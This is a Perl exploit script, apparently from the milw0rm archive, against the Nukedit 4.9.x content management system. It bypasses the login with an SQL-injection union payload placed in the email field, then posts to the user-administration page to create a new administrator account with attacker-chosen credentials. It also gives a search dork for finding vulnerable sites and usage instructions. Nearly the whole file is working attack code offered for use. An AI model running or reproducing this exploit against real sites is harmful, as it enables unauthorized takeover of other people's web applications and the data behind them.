#!/usr/bin/perl
###########################################################
#Title:       Nukedit 4.9.x Create Admin Exploit          #
#                                                         #
#Credit:      r3dm0v3                                     #
#             http://r3dm0v3.persianblog.ir               #
#             r3dm0v3[4t]yahoo[dot]com                    #
#             Tehran - Iran                               #
#                                                         #
#Download:    http://www.nukedit.com/content/Download.asp #
#Vulnerables: 4.9.x, prior versions maybe affected.       #
#Remote:      Yes                                         #
#Dork:        "Powered by Nukedit"                        #
#Fix:         Not Available                               #
###########################################################

use LWP::UserAgent;
use HTTP::Cookies;


$host = $ARGV[0];
if (substr($host,length($host)-1,1) ne "/"){
    $host.="/";
}
$usrmail = $ARGV[1];
$passwd = $ARGV[2];
$url = "http://".$host;
$usrSQL= "' union select 1,1,'r3dm0v3',4,'ENCfc2aef9fe5f2c546429e2e1d9fd737e6da5b1b94707518619576129a915d0c2c',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from tblusers where 'x'='x";


&Banner();
if (@ARGV < 3) {
&Usage();
exit(1);
}


print "[~] Host: $host \n";
print "[~] Email/Password: $usrmail/$passwd\n";
print "[~] Logging in...\n";


$xpl = LWP::UserAgent->new() || die;
$cookie_jar = HTTP::Cookies->new();

$xpl->cookie_jar( $cookie_jar );
$res = $xpl->post($url.'utilities/login.asp',
Content => [
"redir"        => "/nukedit/default.asp",
"email"        => "$usrSQL",
"password"     => "r3dm0v3",
"savepassword" => "false",
"submit"       => "Login",
],);



if ($res->content =~ /Object Moved/){
    print "[+] Logged in\n";
}else{
    print "[-] Can not login!\n";
    exit();
}


print "[~] Creating Admin...\n";


$res = $xpl->post($url.'utilities/useradmin.asp',
Content => [
"action"          => "addDB",
"username"        => "r3dm0v3",
"company"         => "red move",
"url"             => "http://r3dm0v3.persianblog.ir",
"address"         => "a",
"county"          => "b",
"zip"             => "666",
"country"         => "Iran",
"phone"           => "66666666",
"fax"             => "12345678",
"email"           => "$usrmail",
"password"        => "$passwd",
"groupid"         => "1",
"submit1"         => "Add User >>",
"IP"              => "127.0.0.2",
],);


if ($res->content =~ /Object Moved/){
    print "[+] Admin added. Login info:\n".
          "    email:    $usrmail\n".
          "    password: $passwd\n";
}else{
    print "[-] Exploit failed!\n";
    print $res->content;
}



sub Banner{
print "############################################################\n".
      "#            Nukedit 4.9.x Create Admin Exploit            #\n".
      "#                       by r3dm0v3                         #\n".
      "#                  r3dm0v3[4t]yahoo[.]com                  #\n".
      "#               http://r3dm0v3.persianblog.ir              #\n".
      "############################################################\n";
}


sub Usage(){
print "\n Usage: nukedit.pl <host&path> <email> <password>\n";
print " ex.  : nukedit.pl site.com/nukedit/ myname\@somewhere.com 123456\n";
}

# milw0rm.com [2008-02-26]
